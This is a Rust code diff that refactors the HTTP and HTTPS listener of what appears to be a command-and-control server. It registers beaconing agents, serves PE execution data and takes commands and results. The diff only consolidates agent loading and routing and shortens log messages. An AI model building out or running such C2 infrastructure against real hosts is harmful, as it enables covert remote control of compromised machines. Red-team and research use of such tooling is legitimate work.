-                .unwrap()
-        }
-    }
-}
-
-pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, database: Arc<Database>) {
-    let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));
-
-    log::info!(
-        "[*] Loading existing agents for listener '{}'...",
-        profile.name
-    );
-    match agent_handler.load_agents_from_db(&database) {
-        Ok(count) => {
-            if count > 0 {
-                log::info!("[+] ✅ Restored {} existing agent(s) from database", count);
-            } else {
-                log::info!("[*] No existing agents to restore");
-            }
-        }
-        Err(e) => {
-            log::error!("[!] ⚠️  Failed to load agents from database: {}", e);
-            log::warn!("[!] Continuing without restored agents...");
-        }
-    }
-
-    let state = Arc::new(HttpListenerState {
-        profile: profile.clone(),
-        agent_handler,
-        xor_cipher,
-        database,
-    });
-
-    let app = Router::new()
-        .route(&profile.uri_paths, post(handle_beacon))
-        .route("/api/pe-data/:command_id", get(get_pe_exec_data))
+    Router::new()
+        .route(&uri_path, post(handle_beacon))
+        .route("/api/pe-data/:command_id", get(handle_pe_data))
         .route("/api/command", post(handle_get_commands))
         .route("/api/result", post(handle_submit_result))
-        .with_state(state);
+        .with_state(state)
+}
+
+fn load_agents_from_db(
+    listener_name: &str,
+    agent_handler: &AgentHandler,
+    database: &Arc<Database>,
+) {
+    log::info!("[*] Loading agents for listener '{}'...", listener_name);
+
+    match agent_handler.load_agents_from_db(database) {
+        Ok(count) if count > 0 => {
+            log::info!("[+] Restored {} agent(s) from database", count);
+        }
+        Ok(_) => {
+            log::info!("[*] No existing agents to restore");
+        }
+        Err(e) => {
+            log::error!("[!] Failed to load agents: {}", e);
+        }
+    }
+}
+
+// ============================================================================
+// PUBLIC API
+// ============================================================================
+
+pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, database: Arc<Database>) {
+    load_agents_from_db(&profile.name, &agent_handler, &database);
+
+    let state = Arc::new(ListenerState::new(profile.clone(), agent_handler, database));
+    let app = build_router(state);
 
     let addr = SocketAddr::from(([0, 0, 0, 0], profile.port));
     log::info!("[+] HTTP Listener '{}' starting on {}", profile.name, addr);
 
-    let server = Server::bind(&addr).serve(app.into_make_service());
-
-    if let Err(e) = server.await {
-        log::error!("[!] Listener error: {}", e);
+    if let Err(e) = Server::bind(&addr).serve(app.into_make_service()).await {
+        log::error!("[!] HTTP Listener error: {}", e);
     }
 }
 
@@ -826,25 +559,7 @@ pub async fn start_https(
     agent_handler: AgentHandler,
     database: Arc<Database>,
 ) {
-    let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));
-
-    log::info!(
-        "[*] Loading existing agents for HTTPS listener '{}'...",
-        profile.name
-    );
-    match agent_handler.load_agents_from_db(&database) {
-        Ok(count) => {
-            if count > 0 {
-                log::info!("[+] ✅ Restored {} existing agent(s) from database", count);
-            } else {
-                log::info!("[*] No existing agents to restore");
-            }
-        }
-        Err(e) => {
-            log::error!("[!] ⚠️  Failed to load agents from database: {}", e);
-            log::warn!("[!] Continuing without restored agents...");
-        }
-    }
+    load_agents_from_db(&profile.name, &agent_handler, &database);
 
     let tls_config = match RustlsConfig::from_pem(
         profile.tls_cert.as_bytes().to_vec(),
@@ -853,12 +568,11 @@ pub async fn start_https(
     .await
     {
         Ok(config) => {
-            log::info!("[+] TLS configuration loaded successfully");
+            log::info!("[+] TLS configuration loaded");
             config
         }
         Err(e) => {
-            log::error!("[!] Failed to load TLS configuration: {}", e);
-            log::error!("[!] Make sure the certificate and key are valid PEM format");
+            log::error!("[!] Failed to load TLS config: {}", e);
             return;
         }
     };
@@ -874,23 +588,12 @@ pub async fn start_https(
         http_headers: profile.http_headers.clone(),
     };
 
-    let state = Arc::new(HttpListenerState {
-        profile: http_profile.clone(),
-        agent_handler,
-        xor_cipher,
-        database,
-    });
-
-    let app = Router::new()
-        .route(&http_profile.uri_paths, post(handle_beacon))
-        .route("/api/pe-data/:command_id", get(get_pe_exec_data))
-        .route("/api/command", post(handle_get_commands))
-        .route("/api/result", post(handle_submit_result))
-        .with_state(state);
+    let state = Arc::new(ListenerState::new(http_profile, agent_handler, database));
+    let app = build_router(state);
 
     let addr = SocketAddr::from(([0, 0, 0, 0], profile.port));
     log::info!(
-        "[+] HTTPS Listener '{}' starting on {} (TLS enabled)",
+        "[+] HTTPS Listener '{}' starting on {} (TLS)",
         profile.name,
         addr
     );
